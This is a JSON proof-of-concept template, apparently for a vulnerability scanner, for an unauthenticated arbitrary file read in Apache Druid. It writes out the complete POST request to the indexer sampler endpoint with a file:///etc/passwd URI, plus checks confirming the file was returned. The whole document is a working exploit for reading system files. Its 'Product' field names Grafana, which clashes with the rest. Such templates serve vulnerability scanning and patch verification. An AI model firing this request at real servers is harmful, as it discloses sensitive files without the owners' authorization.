{
    "Name": "Apache Druid 任意文件读取",
    "Description": "由于用户指定 HTTP InputSource 没有做出限制，可以通过将文件 URL 传递给 HTTP InputSource 来绕过应用程序级别的限制。由于 Apache Druid 默认情况下是缺乏授权认证，攻击者可利用该漏洞在未授权情况下，构造恶意请求执行文件读取，最终造成服务器敏感性信息泄露",
    "Product": "Grafana",
    "author": "chumeng",
    "Request":[
        {
        "Method": "POST",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36","Content-Type":"application/json;charset=UTF-8"},
        "Uri":"/druid/indexer/v1/sampler?for=connect",
        "Port":"",
        "Data":"{\"type\":\"index\",\"spec\":{\"type\":\"index\",\"ioConfig\":{\"type\":\"index\",\"firehose\":{\"type\":\"http\",\"uris\":[\"file:///etc/passwd\"]}},\"dataSchema\":{\"dataSource\":\"sample\",\"parser\":{\"type\":\"string\",\"parseSpec\":{\"format\":\"regex\",\"pattern\":\"(.*)\",\"columns\":[\"a\"],\"dimensionsSpec\":{},\"timestampSpec\":{\"column\":\"!!!_no_such_column_!!!\",\"missingValue\":\"2010-01-01T00:00:00Z\"}}}}},\"samplerConfig\":{\"numRows\":500,\"timeoutMs\":15000}}",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"",
                "Value": "root:x:0:"
                },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":""
                }
]}
